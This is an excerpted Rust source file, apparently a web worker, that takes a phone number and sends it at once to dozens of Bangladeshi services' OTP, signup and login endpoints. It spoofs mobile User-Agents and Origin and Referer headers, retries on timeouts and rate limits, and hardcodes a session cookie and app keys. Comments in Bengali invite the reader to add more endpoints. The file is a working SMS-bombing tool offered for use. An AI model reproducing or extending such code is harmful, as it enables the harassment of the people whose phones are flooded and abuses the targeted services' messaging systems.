...
async fn fire_once(
    ...
    let mut h = Headers::new();
    for (k, v) in headers { let _ = h.set(k, v); }
    init.with_headers(h);
    init.with_body(Some(payload.to_string().into()));

    let timeout_ms: i32 = 8000;
    let timeout_promise = js_sys::Promise::new(&mut |_, reject| {
        web_sys::window().unwrap()
            .set_timeout_with_callback_and_timeout_and_arguments_0(&reject, timeout_ms)
            .unwrap();
    });
    ...
    let fetch_promise = match Request::new_with_init(url, &init) {
        Ok(req) => wasm_bindgen_futures::future_to_promise(async move {
            match Fetch::Request(req).send().await {
                Ok(mut r) => {
                    let s = r.status_code();
                    let v = json!({"api": name, "status": s, "ok": s==200||s==201||s==202, "url": url});
...
// ── fire: retry once on timeout/5xx, skip retry on 4xx ──
async fn fire(
    name:    &'static str,
    url:     &'static str,
    payload: Value,
    ...
    for attempt in 0..2u8 {
        let r = fire_once(name, url, &payload, headers).await;
        ...
        // 4xx এ retry বেকার
        if matches!(status, 400|401|403|404|405|410|422|451) { return r; }

        // 429 rate limit — একটু wait করে retry
...
pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    ...
    let is_blocked = BLOCKED_NUMBERS.iter().any(|&b| {
        ...
        number_str == b || n == bn || format!("880{n}") == b || number_str == format!("880{bn}")
    });
    ...
    let api_results = parallel![
        ...
        fire("Shadhin Music",
            ...
            &[("Content-Type","application/json"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("Khaodao",
        ...
        fire("Nexo Pat",
            ...
            json!({"phone": number}),
            &[("Content-Type","application/json"),("Origin","https://www.nexopet.com"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("AWS POC",
        ...
        fire("Mojaru",
            ...
            &[("Content-Type","application/x-www-form-urlencoded"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("Upay",
        ...
        fire("Chorki",
            ...
            json!({"number": plus_bd}),
            &[("Content-Type","application/json"),("Origin","https://www.chorki.com"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("Deepto Play",
            "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
            json!({"number": plus_bd}),
            &[("Host","api.deeptoplay.com"),("User-Agent","Mozilla/5.0"),("Content-Type","application/json"),("Origin","https://www.deeptoplay.com")]
        ),
        fire("RedX",
            "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
            json!({"phoneNumber": number}),
            &[("Content-Type","application/json"),("Referer","https://redx.com.bd/"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("Bohubrihi",
        ...
        fire("Shikho",
            ...
            &[("Content-Type","application/json"),("Accept","application/json"),("Build-Version","(450) 4.5.0"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("Shikho 2",
        ...
        fire("Easy BD",
            ...
            &[("Content-Type","application/json"),("Host","core.easy.com.bd"),("Connection","keep-alive"),("lang","en"),("device-key","48b1f7061f48c950090220f62128b2c3"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("MyGuardian BD",
        ...
        fire("Munchies BD",
            ...
            json!({"phone": number}),
            &[("Content-Type","application/json"),("X-Parse-Application-Id","munchiesbd"),("X-Parse-REST-API-Key","munchiesbd"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("NRB Bazaar",
            ...
            &[("Content-Type","application/x-www-form-urlencoded"),("Cookie",".Nop.Antiforgery=CfDJ8N5UM1Mg0_JFs4qu7TCIBSzGu689vm8mbvSPQ743hQSg8CQN0NF_XzfjEsi78OgkEPagdV_jE0-Bv17i3ToM1axTnWqbYcicXyGSwLVIJt-Jpak2l8yoNfuDZsgWG4Hlg4xPW4OOpCtcsf5xmMkdvFk"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("Medico Bio",
            ...
            &[("Content-Type","application/json"),("Origin","https://medico.bio"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("Paymaster BD",
        ...
        fire("Fundesh",
            ...
            json!({"msisdn": bd_no}),
            &[("Content-Type","application/json"),("Origin","https://fundesh.com.bd"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("Ghoori Learning",
            "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
            json!({"mobile_no": number}),
            &[("Content-Type","application/json"),("Host","api.ghoorilearning.com"),("Referer","https://ghoorilearning.com/"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("ExpressHub",
            "https://expresshub.com.bd/User/CreateNewUser",
            json!({"_UID": number, "_UNAME": "0", "_MAIL": "0", "_PHONE": "0", "_PASS": "0", "_TYPE": "1"}),
            &[("Content-Type","application/x-www-form-urlencoded"),("Origin","https://expresshub.com.bd"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("Pharmaid RX",
            "https://shop.pharmaid-rx.com/api/sendSMSRegistration",
            json!({"mobileNumber": number}),
            &[("Content-Type","application/json"),("Host","shop.pharmaid-rx.com"),("User-Agent","Mozilla/5.0")]
        ),
        fire("Practice Club",
        ...
        fire("Sundarban Courier",
            ...
            &[("Content-Type","application/json"),("Origin","https://customer.sundarbancourierltd.com"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("Easy BD Reg",
            "https://core.easy.com.bd/api/v1/registration",
        ...
        fire("Osud Kini",
            ...
            json!({"phoneNo": number}),
            &[("Content-Type","application/json"),("Connection","keep-alive"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("ABC Lit",
        ...
        fire("Bepari App",
            ...
            &[("Content-Type","application/json"),("Origin","https://www.bestfreshfarm.com"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        ...
        fire("Rangs Motors",
            ...
            json!({"u_num": number}),
            &[("Content-Type","application/json"),("Origin","https://www.garimela.com"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        fire("WinBaji",
            "https://userapi.fairbet91.com/api/RegisterUser/GenerateOTPV2",
            json!({"Mobile": number, "SiteCode": "WBJ"}),
            &[("Content-Type","application/json"),("Origin","https://winbaji.com"),("User-Agent","Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36")]
        ),
        ...
        // নতুন API এখানে যোগ করো:
        // fire("API নাম", "https://url", json!({"phone": number}),
